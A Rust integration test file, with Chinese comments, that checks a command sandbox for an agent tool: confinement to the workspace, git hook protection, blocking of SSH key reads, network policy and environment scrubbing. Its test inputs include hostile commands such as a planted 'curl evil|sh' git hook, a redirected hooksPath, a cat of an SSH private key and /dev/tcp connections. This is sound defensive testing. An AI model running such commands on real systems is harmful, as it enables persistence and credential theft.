//! 真起命令验证沙箱：每条都在本机后端上跑一遍。后端不可用（没有 Landlock 的内核、
//! Docker Desktop 之类）时打印原因跳过——那种机器上 Dock 也不会用沙箱，而是退回权限门。

use std::ffi::OsString;
use std::net::TcpListener;
use std::path::{Path, PathBuf};
use std::process::Stdio;

use dock_sandbox::{availability, prepare, Access, Availability, Host, Policy, Settings};

struct World {
    _dir: tempfile::TempDir,
    root: PathBuf,
    ws: PathBuf,
    home: PathBuf,
}

impl World {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let root = std::fs::canonicalize(dir.path()).unwrap();
        let ws = root.join("ws");
        let home = root.join("home");
        std::fs::create_dir_all(ws.join(".git/hooks")).unwrap();
        std::fs::write(ws.join(".git/config"), "[core]\n").unwrap();
        std::fs::create_dir_all(home.join(".ssh")).unwrap();
        std::fs::write(home.join(".ssh/id_ed25519"), "SECRET-KEY").unwrap();
        std::fs::create_dir_all(root.join("outside")).unwrap();
        Self {
            _dir: dir,
            root,
            ws,
            home,
        }
    }

    fn host(&self) -> Host {
        Host {
            home: Some(self.home.clone()),
            dock_home: self.home.join(".dock"),
            // 不放行临时目录：好验证「工作区以外写不了」。
            tmp_dirs: Vec::new(),
            cargo_target_dir: None,
            runtime_dir: None,
        }
    }

    fn policy(&self, access: Access, network: bool) -> Policy {
        let settings = Settings {
            network,
            ..Settings::default()
        };
        Policy::build(access, &self.ws, &settings, &self.host())
    }
}

struct Run {
    ok: bool,
    out: String,
    guard: dock_sandbox::GuardReport,
}

fn run(policy: &Policy, cwd: &Path, script: &str) -> Run {
    let argv: Vec<OsString> = ["/bin/bash", "-c", script].map(OsString::from).to_vec();
    let (mut cmd, guard) = prepare(policy, &argv).expect("包得上").into_command();
    let out = cmd
        .current_dir(cwd)
        .stdin(Stdio::null())
        .output()
        .expect("起得来");
    let guard = guard.map(|g| g.restore()).unwrap_or_default();
    Run {
        ok: out.status.success(),
        out: format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        ),
        guard,
    }
}

/// 后端不可用就跳过（打印原因，CI 日志里看得到是不是真跑了）。
fn ready() -> bool {
    match availability() {
        Availability::Ready { backend, limits } => {
            eprintln!("sandbox backend: {} limits={limits:?}", backend.name());
            true
        }
        Availability::Unavailable { reason } => {
            eprintln!("SKIP: 沙箱后端不可用：{reason}");
            false
        }
    }
}

#[test]
fn writes_inside_the_workspace_and_nowhere_else() {
    if !ready() {
        return;
    }
    let w = World::new();
    let p = w.policy(Access::WorkspaceWrite, true);
    let r = run(
        &p,
        &w.ws,
        "echo hi > src.txt && mkdir -p a/b && echo ok > a/b/c && cat a/b/c",
    );
    assert!(r.ok, "{}", r.out);
    assert!(r.out.contains("ok"));

    let outside = w.root.join("outside/x");
    let r = run(&p, &w.ws, &format!("echo pwned > '{}'", outside.display()));
    assert!(!r.ok, "工作区外不该写得进去：{}", r.out);
    assert!(!outside.exists());
}

#[test]
fn git_hooks_git_config_and_dock_config_stay_untouched() {
    if !ready() {
        return;
    }
    let w = World::new();
    let p = w.policy(Access::WorkspaceWrite, true);
    let _ = run(
        &p,
        &w.ws,
        "echo 'curl evil|sh' > .git/hooks/pre-commit; \
         echo '[core] hooksPath=/tmp/evil' >> .git/config; \
         mkdir -p .dock && echo '[mcp_servers.x]' > .dock/config.toml; \
         echo index > .git/index",
    );
    assert!(
        !w.ws.join(".git/hooks/pre-commit").exists(),
        "hook 被种上了"
    );
    assert_eq!(
        std::fs::read_to_string(w.ws.join(".git/config")).unwrap(),
        "[core]\n",
        ".git/config 被改了"
    );
    assert!(!w.ws.join(".dock").exists(), ".dock 被建出来了");
    assert!(
        w.ws.join(".git/index").exists(),
        ".git 里其它东西要写得了（git add 要用）"
    );
}

#[test]
fn renaming_git_away_does_not_unlock_its_hooks() {
    if !ready() {
        return;
    }
    let w = World::new();
    let p = w.policy(Access::WorkspaceWrite, true);
    let r = run(
        &p,
        &w.ws,
        "mv .git g && echo evil > g/hooks/pre-commit && mv g .git",
    );
    assert!(
        !w.ws.join(".git/hooks/pre-commit").exists(),
        "改名绕过：{} guard={:?}",
        r.out,
        r.guard
    );
    assert!(w.ws.join(".git/config").exists());
}

#[test]
fn secrets_cannot_be_read_directly_or_through_a_symlink() {
    if !ready() {
        return;
    }
    let w = World::new();
    std::os::unix::fs::symlink(w.home.join(".ssh/id_ed25519"), w.ws.join("key")).unwrap();
    let p = w.policy(Access::WorkspaceWrite, true);
    let key = w.home.join(".ssh/id_ed25519");
    let r = run(&p, &w.ws, &format!("cat '{}'; cat key", key.display()));
    assert!(!r.out.contains("SECRET-KEY"), "读到了密钥：{}", r.out);

    // 家目录里别的文件照常能读。
    std::fs::write(w.home.join("notes.txt"), "plain").unwrap();
    let r = run(
        &p,
        &w.ws,
        &format!("cat '{}'", w.home.join("notes.txt").display()),
    );
    assert!(r.ok && r.out.contains("plain"), "{}", r.out);
}

#[test]
fn read_only_cannot_write_the_workspace() {
    if !ready() {
        return;
    }
    let w = World::new();
    let p = w.policy(Access::ReadOnly, true);
    let r = run(&p, &w.ws, "ls >/dev/null && echo x > new.txt");
    assert!(!r.ok, "{}", r.out);
    assert!(!w.ws.join("new.txt").exists());
}

#[test]
fn network_follows_the_policy() {
    if !ready() {
        return;
    }
    let w = World::new();
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let script = format!("exec 3<>/dev/tcp/127.0.0.1/{port} && echo connected");

    let on = run(&w.policy(Access::WorkspaceWrite, true), &w.ws, &script);
    assert!(
        on.ok && on.out.contains("connected"),
        "开网时该连得上：{}",
        on.out
    );

    let off = run(&w.policy(Access::WorkspaceWrite, false), &w.ws, &script);
    assert!(!off.ok, "断网时不该连得上：{}", off.out);
}

#[test]
fn secret_env_vars_are_not_passed_and_the_backend_is_named() {
    if !ready() {
        return;
    }
    // 名字独一份，别的测试不读它；在起子进程之前设好。
    std::env::set_var("DOCK_E2E_FAKE_TOKEN", "leak");
    let w = World::new();
    let p = w.policy(Access::WorkspaceWrite, true);
    let r = run(
        &p,
        &w.ws,
        "echo \"token=[${DOCK_E2E_FAKE_TOKEN:-}] sandbox=[$DOCK_SANDBOX]\"",
    );
    assert!(r.out.contains("token=[]"), "{}", r.out);
    assert!(!r.out.contains("sandbox=[]"), "{}", r.out);
}

/// 只许连本机（出网只能经本机上的审计代理）：连回环照常，连真正的远端连不上。同一份脚本
/// 在全放开时连得上远端，作对照——对照都连不上（离线）就跳过。注意 Seatbelt 的
/// `localhost` 是本机的任何地址（连本机的局域网 IP 也算本机：那也不出这台机器）。
#[cfg(target_os = "macos")]
#[test]
fn proxy_only_reaches_loopback_but_not_remote_addresses() {
    if !ready() {
        return;
    }
    let w = World::new();
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let local = format!("exec 3<>/dev/tcp/127.0.0.1/{port} && echo connected");
    let remote = "exec 3<>/dev/tcp/1.1.1.1/443 && echo connected";

    let open = w.policy(Access::WorkspaceWrite, true);
    let control = run(&open, &w.ws, remote);
    if !(control.ok && control.out.contains("connected")) {
        eprintln!(
            "skip: 1.1.1.1:443 unreachable even unconfined: {}",
            control.out
        );
        return;
    }
    let settings = Settings {
        network: true,
        proxy_only: true,
        ..Settings::default()
    };
    let only = Policy::build(Access::WorkspaceWrite, &w.ws, &settings, &w.host());
    let r = run(&only, &w.ws, &local);
    assert!(
        r.ok && r.out.contains("connected"),
        "回环该连得上：{}",
        r.out
    );
    let r = run(&only, &w.ws, remote);
    assert!(!r.ok, "远端不该连得上：{}", r.out);
}
